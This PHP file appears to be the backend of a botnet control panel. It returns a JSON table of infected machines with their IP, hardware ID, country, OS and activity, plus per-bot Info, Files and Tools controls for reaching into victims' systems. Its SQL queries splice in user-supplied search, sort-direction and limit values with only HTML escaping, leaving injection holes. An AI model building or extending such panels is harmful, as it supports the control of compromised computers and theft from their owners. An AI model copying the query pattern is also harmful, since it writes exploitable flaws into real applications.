<?php
    @session_start();
    include_once '../includes/functions.php';
    include_once '../includes/checks.php';
     
    header('Content-type: application/json; charset=UTF-8');

    if(isset($_SESSION['ID'])){

      $query = '';
      $query .= "SELECT * FROM `bots` WHERE `uid`=? ";
      if(!empty($_POST["search"]["value"])){
        $query .= 'AND(`country` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `botName` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `os` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `ip` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `lastactivity` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%" OR `hwid` LIKE "%'.htmlspecialchars($_POST["search"]["value"]).'%")';
      }
      if(isset($_POST["order"])){
        $column = htmlspecialchars($_POST['order']['0']['column']);
        if($column == 0){
          $query .= ' ORDER BY `botname` '.htmlspecialchars($_POST['order']['0']['dir']).' ';
        }elseif($column == 1){
          $query .= ' ORDER BY `country` '.htmlspecialchars($_POST['order']['0']['dir']).' ';
        }elseif($column == 2){
          $query .= ' ORDER BY `active` '.htmlspecialchars($_POST['order']['0']['dir']).' ';
        }elseif($column == 3){
          $query .= ' ORDER BY `lastactivity` '.htmlspecialchars($_POST['order']['0']['dir']).' ';
        }
      }
      else{
        $query .= ' ORDER BY `lastactivity` DESC ';
      }
      if($_POST["length"] != -1){
        $query .= 'LIMIT ' . htmlspecialchars($_POST['start']) . ', ' . htmlspecialchars($_POST['length']);
      }
      //echo $query;
      $stmt = $db->prepare($query);
      $stmt->execute([htmlspecialchars($_SESSION['ID'])]); 
      $results = $stmt->fetchAll();
      $row = $stmt->rowCount();
      
      $nRows = htmlspecialchars(pdoQuery($db, "SELECT COUNT(*) FROM `bots` WHERE `uid`=?", [htmlspecialchars($_SESSION['ID'])])->fetchColumn());
  
      $data = array();
      foreach($results as $result){
          $botname = htmlspecialchars($result['botname']);
          $country = htmlspecialchars($result['country']);
          $os = htmlspecialchars($result['os']);
          $ip = htmlspecialchars($result['ip']);
          $active = htmlspecialchars($result['active']);
          $last = htmlspecialchars($result['lastactivity']);
          $uID = htmlspecialchars($result['botID']);

          $data[] = array(
              "Bot Name" => $botname,
              "Country" => $country,
              "Active" => $active,
              "Last Activity" => $last,
              "Options" => "<tr>
              <td scope=\"row\" style='word-break:break-all;'>
              <div class='btn-group-vertical' role='group' aria-label='Vertical button group'>
                <button type='button' class='btn btn-outline-secondary btn-sm bot-action-button' data-toggle='modal' data-target='#view-modal' data-id='$uID' id='getUser' data-ripple-color='dark'><i class='fas fa-info mr-2'></i> Info</button>
                <button type='button' class='btn btn-outline-secondary btn-sm bot-action-button' data-toggle='modal' data-target='#view-modal' data-id='$uID' id='getFiles' data-ripple-color='dark'><i class='fas fa-folder-open mr-2'></i> Files</button>
                <button type='button' class='btn btn-outline-secondary btn-sm bot-action-button' data-toggle='modal' data-target='#view-modal' data-id='$uID' id='getTools' data-ripple-color='dark'><i class='fas fa-tools'></i> Tools</button>
              </div>
              </td>
              </tr>"
           );
      }
  
      $draw = htmlspecialchars($_POST['draw']);
      ## Response
      $response = array(
          "draw" => intval($draw),
          "recordsTotal" => $row,
          "recordsFiltered" => $nRows,
          "data" => $data
      );
  
      echo json_encode($response);
    }else{
      echo "Hi";
    }
?>